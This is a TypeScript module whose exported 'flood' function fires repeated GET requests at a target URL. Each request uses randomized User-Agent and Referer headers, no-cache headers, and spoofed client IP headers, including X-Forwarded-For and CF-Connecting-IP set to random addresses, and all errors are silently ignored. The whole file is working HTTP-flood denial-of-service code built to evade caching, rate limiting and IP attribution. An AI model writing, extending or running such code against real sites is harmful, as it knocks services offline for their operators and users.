import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const target = url.startsWith("http") ? url : `http://${url}`

  for (let i = 0; i < rpc; i++) {
    try {
      await fetch(target, {
        method: "GET",
        headers: {
          "User-Agent": randomChoice(USER_AGENTS),
          "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
          "Cache-Control": "no-cache",
          "Pragma": "no-cache",
          "Connection": "keep-alive",
          "Referer": randomChoice(REFERERS),
          "X-Forwarded-For": randIp(),
          "X-Real-IP": randIp(),
          "CF-Connecting-IP": randIp(),
        },
        redirect: "follow",
      })
      onStats(1, 500)
    } catch {}
  }
}
